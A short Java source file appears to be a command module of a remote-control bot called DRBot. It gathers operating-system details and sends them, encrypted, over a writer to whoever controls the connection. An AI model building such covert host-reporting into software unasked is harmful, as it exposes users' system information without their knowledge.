package com.DRBot.Commands;

import com.DRBot.OS.OsProp;
import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;

/**
 *
 * @author MerNat
 */

public class pcinf implements Runnable{
    
    private final OsProp prop;
    private final PrintWriter writer;
    private final SecureLine secureLine;
    public pcinf(PrintWriter writer,SecureLine secureLine){
        this.secureLine = secureLine;
        this.writer = writer;
        prop = new OsProp();
    }
    
    @Override
    public void run(){
        toPrint(prop.getOsStat());
    }
    
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
}
